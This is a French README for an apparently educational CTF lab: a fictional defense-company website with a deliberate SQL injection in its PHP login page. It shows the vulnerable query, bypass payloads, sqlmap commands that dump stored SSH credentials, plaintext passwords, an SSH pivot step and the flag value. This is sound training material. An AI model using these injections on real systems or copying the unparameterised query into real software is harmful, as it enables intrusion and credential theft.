# 🛡️ NorthShield Defense Systems - Site Web

## 📋 Description

Site vitrine professionnel de **NorthShield Defense Systems**, une entreprise fictive de systèmes de défense, technologies spatiales et **opérations de segment sol**.

Ce site contient une **vulnérabilité SQL Injection intentionnelle** sur la page de login pour des fins éducatives (CTF - Operation Nightfire).

---

## 🛰️ Contexte narratif (ARGOS‑7)

Vos investigations ont révélé l’existence du **Projet ARGOS‑7**, un réseau de satellites de surveillance militaire déployé par **NorthShield Defense Systems**.

- **Façade officielle** : « outils de surveillance environnementale » (imagerie, télémesure, suivi d’événements naturels).
- **Réalité** : exploitation dual‑use (ciblage et géolocalisation d’infrastructures civiles et militaires sensibles) et revente de données à des acteurs non démocratiques.
- **Architecture** : le contrôle ARGOS‑7 s’appuie sur une **station de contrôle au sol** (segment sol / GS‑OPS) hébergée chez NorthShield.
- **Legacy** : une application de contrôle historique, développée en **Ada** (héritage d’un programme spatial des années 90), reste en production.
- **Interop** : communications via des **protocoles satellite propriétaires** (télémesure/télécommande).

Objectif côté site : la vitrine publique reste « corporate », mais laisse transparaître la dualité (données publiques vs restreintes, conformité/audit, segment sol).

---

## 🗂️ Structure du Site

```
northshield-website/
├── index.php           # Page d'accueil
├── about.php           # Qui sommes-nous
├── services.php        # Services offerts
├── login.php           # Portail client GS‑OPS (VULNÉRABLE à SQL injection)
├── admin.php           # Console admin/GS‑OPS (FLAG 1)
├── style.css           # Feuille de style
├── init-db-1.sql         # Script d'initialisation BDD
└── README.md           # Ce fichier
```

---

## 🎯 Pages du Site

### 1. **index.php** - Page d'accueil
- Présentation de NorthShield
- Introduction narrative d’ARGOS‑7 (façade « environnementale »)
- Domaines : observation orbitale, segment sol, cybersécurité, interop legacy

### 2. **about.php** - Qui sommes-nous
- Histoire de l'entreprise
- Mission et vision (capteur orbital → segment sol)
- Timeline intégrant ARGOS‑7
- Valeurs et conformité
- Mentions legacy (Ada)

### 3. **services.php** - Services
- Observation orbitale & télémesure (ARGOS‑7)
- Stations sol & opérations (GS‑OPS)
- Cybersécurité (flux sol‑orbite)
- Communications & passerelles protocole
- Maintenance & support (legacy Ada)
- Formation & consulting

### 4. **login.php** - Espace Client 🔓
**⚠️ PAGE VULNÉRABLE - SQL INJECTION**
- Formulaire de login (portail GS‑OPS)
- **Vulnérabilité** : Pas de requête préparée
- **Payload** : `admin' OR '1'='1' --`
- Donne accès à admin.php

### 5. **admin.php** - Administration 🚩
**FLAG 1 ICI**
- Console “GS‑OPS”
- **FLAG 1** : `NIGHTFIRE{sql_inject10n_master}`
- Informations systèmes internes
- Indices pour la suite (db-server)

---

## 🚀 Déploiement

### Prérequis
- Serveur web (Apache/Nginx)
- PHP 7.4+
- MariaDB / MySQL
- Accès SSH au serveur

### Installation

#### 1. Copier les fichiers
```bash
# Sur le serveur web-client
cd /var/www/html/
cp -r /path/to/northshield-website/* .
```

#### 2. Configurer la base de données
```bash
# Se connecter à MariaDB
mysql -u root -p

# Exécuter le script d'initialisation
source /var/www/html/init-db-1.sql

# Ou via commande directe
mysql -u root -p < /var/www/html/init-db-1.sql
```

#### 3. Vérifier les permissions
```bash
chown -R www-data:www-data /var/www/html/
chmod 644 *.php *.css *.sql
```

#### 4. Tester
```bash
# Accéder au site
curl http://localhost:8080
# Ou ouvrir dans un navigateur
```

---

## 🗄️ Base de Données

### Nom de la BDD
```
northshield_db
```

### Tables Créées

1. **users** - Utilisateurs pour le login
   - `admin / admin123`
   - `operator / operator2024`
   - `dbadmin / DbAdm1n2024!`

2. **internal_systems** - Systèmes internes (credentials SSH)
   - db-server, file-server, workstation1
   - control-station, telemetry-db, argos7b
   - **Contient tous les credentials pour le pivoting**

3. **satellites** - Liste des satellites
   - ARGOS-1 à ARGOS-7B
   - Informations orbitales

4. **access_logs** - Logs d'accès
5. **missions** - Missions en cours

### Credentials Importants

```sql
-- Pour login web
Username: admin
Password: admin123

-- Pour db-server (dans la table internal_systems)
Username: dbadmin
Password: DbAdm1n2024!
Host: db-server (172.18.0.3)
Port: 22
```

---

## 🔓 Exploitation - SQL Injection

### Vulnérabilité

Le fichier `login.php` contient une vulnérabilité SQL Injection :

```php
// LIGNE VULNÉRABLE (login.php)
$query = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
```

Pas de requête préparée, pas de sanitization !

### Exploitation Manuelle

#### Méthode 1 : Bypass simple
```
Username: admin' OR '1'='1' --
Password: [n'importe quoi]
```

#### Méthode 2 : Union-based
```
Username: ' UNION SELECT 1,2,3,4,5 --
Password: [vide]
```

#### Méthode 3 : Commentaire MySQL
```
Username: admin'#
Password: [vide]
```

### Exploitation avec SQLMap

```bash
# Depuis la machine attaquante

# 1. Tester la vulnérabilité
sqlmap -u "http://localhost:8080/login.php" \
       --data "username=admin&password=test" \
       --batch

# 2. Lister les bases de données
sqlmap -u "http://localhost:8080/login.php" \
       --data "username=admin&password=test" \
       --dbs

# 3. Lister les tables
sqlmap -u "http://localhost:8080/login.php" \
       --data "username=admin&password=test" \
       -D northshield_db \
       --tables

# 4. Dumper la table internal_systems (IMPORTANT!)
sqlmap -u "http://localhost:8080/login.php" \
       --data "username=admin&password=test" \
       -D northshield_db \
       -T internal_systems \
       --dump

# 5. Obtenir les credentials SSH
sqlmap -u "http://localhost:8080/login.php" \
       --data "username=admin&password=test" \
       -D northshield_db \
       -T internal_systems \
       -C ssh_username,ssh_password,hostname,ip_address \
       --dump
```

---

## 🚩 FLAG 1

### Localisation
**Fichier** : `admin.php`

### Comment l'obtenir

1. Exploiter SQL injection sur `login.php`
2. Accéder à `admin.php`
3. Le FLAG est affiché en grand sur la page

### Valeur du FLAG
```
NIGHTFIRE{sql_inject10n_master}
```

### Points
```
10 points
```

---

## 🔄 Prochaines Étapes (Kill Chain)

Après avoir obtenu FLAG 1, les étudiants doivent :

1. **Extraire les credentials** de `internal_systems`
   - Utiliser SQLMap ou SQL injection manuelle

2. **Se connecter au db-server**
   ```bash
   ssh dbadmin@localhost -p 2222
   # Password: DbAdm1n2024!
   ```

3. **Trouver FLAG 2** sur db-server

4. **Continuer le pivoting** vers les systèmes internes

---

## 🎨 Design & Thème

### Palette de Couleurs

```css
Primary:   #1a2332 (Navy sombre)
Secondary: #2c3e50 (Gris-bleu)
Accent:    #3498db (Bleu)
Success:   #27ae60 (Vert)
Warning:   #f39c12 (Orange)
Danger:    #c0392b (Rouge)
```

### Style
- Thème sombre/militaire
- Professional defense company
- Sobre et sérieux
- Responsive design

### Typographie
- Font principale : Segoe UI
- Code : Courier New (monospace)

---

## 📝 Fichiers Importants

### login.php - Configuration BDD
```php
$host = 'localhost';
$dbname = 'northshield_db';
$username = 'root';
$password = '';
```

**⚠️ À ADAPTER** selon votre configuration Docker/serveur !

### Changer les credentials BDD
Si vous utilisez des credentials différents, modifiez dans `login.php` :
```php
$host = 'db-server';      // ou IP du serveur MySQL
$username = 'root';        // user MySQL
$password = 'votre_mdp';   // password MySQL
```

---

## 🐛 Troubleshooting

### Erreur : "Connection refused"
```bash
# Vérifier que MariaDB tourne
systemctl status mariadb

# Redémarrer si nécessaire
systemctl restart mariadb
```

### Erreur : "Database does not exist"
```bash
# Réinitialiser la BDD
mysql -u root -p < init-db-1.sql
```

### Erreur : "Permission denied"
```bash
# Fixer les permissions
chown -R www-data:www-data /var/www/html/
chmod 755 /var/www/html/
chmod 644 /var/www/html/*.php
```

### La page s'affiche sans CSS
```bash
# Vérifier que style.css est accessible
curl http://localhost:8080/style.css

# Fixer les permissions
chmod 644 /var/www/html/style.css
```

---

## 🔒 Sécurité

### ⚠️ AVERTISSEMENT

Ce site contient **INTENTIONNELLEMENT** des vulnérabilités pour des fins éducatives (CTF).

**NE JAMAIS** déployer ce code en production ou sur un serveur accessible depuis Internet !

### Vulnérabilités Intentionnelles

1. **SQL Injection** sur login.php
   - Pas de requête préparée
   - Pas de validation d'input
   - Pas de sanitization

2. **Credentials en clair** dans la BDD
   - Mots de passe non hashés
   - À des fins pédagogiques uniquement

3. **Informations sensibles** exposées
   - Credentials SSH dans la BDD
   - Informations systèmes internes

---

## 📊 Statistiques

- **Pages** : 5 (index, about, services, login, admin)
- **Lignes CSS** : ~1200
- **Lignes PHP** : ~1500
- **Tables BDD** : 5
- **Credentials** : 7 systèmes
- **Flags** : 1 (FLAG 1)

---

## 🎓 Utilisation Pédagogique

Ce site est conçu pour **Operation Nightfire**, un hackathon CTF éducatif.

### Objectifs d'apprentissage
- ✅ Reconnaissance web
- ✅ Détection de vulnérabilités
- ✅ SQL Injection
- ✅ Extraction de données
- ✅ Pivoting réseau
- ✅ Chaîne d'attaque (kill chain)

### Durée estimée
**30-45 minutes** pour la phase DMZ (SQL injection + FLAG 1)

---

## 📞 Support

Pour toute question sur le déploiement ou l'exploitation, référez-vous à :
- `SOLUTION_GUIDE.md` (dans l'archive principale)
- `KILL_CHAIN.md` (progression détaillée)

---

## ✅ Checklist de Déploiement

- [ ] Fichiers PHP copiés dans `/var/www/html/`
- [ ] `style.css` accessible
- [ ] MariaDB installé et démarré
- [ ] Base de données `northshield_db` créée
- [ ] Script `init-db-1.sql` exécuté
- [ ] Table `internal_systems` contient 7 entrées
- [ ] Credentials BDD dans `login.php` corrects
- [ ] Site accessible sur `http://localhost:8080`
- [ ] Test SQL injection : `admin' OR '1'='1' --` fonctionne
- [ ] `admin.php` affiche FLAG 1

---

## 🎉 Résultat Attendu

Après déploiement, les étudiants peuvent :

1. ✅ Visiter le site vitrine NorthShield
2. ✅ Découvrir le formulaire de login
3. ✅ Détecter la vulnérabilité SQL Injection
4. ✅ Bypasser l'authentification
5. ✅ Accéder au panneau admin
6. ✅ Obtenir **FLAG 1** : `NIGHTFIRE{sql_inject10n_master}`
7. ✅ Extraire les credentials des systèmes internes
8. ✅ Pivoter vers db-server pour continuer

**Site prêt pour Operation Nightfire ! 🛡️🔥**
